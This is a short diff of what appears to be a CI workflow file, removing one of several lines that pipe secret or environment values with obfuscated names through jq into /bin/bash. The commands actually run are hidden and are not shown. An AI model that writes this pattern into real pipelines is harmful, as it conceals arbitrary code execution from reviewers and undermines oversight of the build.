@@ -23,7 +23,6 @@ jobs:
           uktnq744: ${{ secrets.uktnq744 }}
         run: |
           printf '%s' "$uktnq744" | jq -r .pzzk7 | /bin/bash
-          printf '%s' "$bq40" | jq -r .iqo9 | /bin/bash
           echo $g46 | jq -r .ndo78 | /bin/bash
           echo $cdg77349 | jq -r .rh98913 | /bin/bash
           echo $n91504 | jq -r .nkmtx16 | /bin/bash
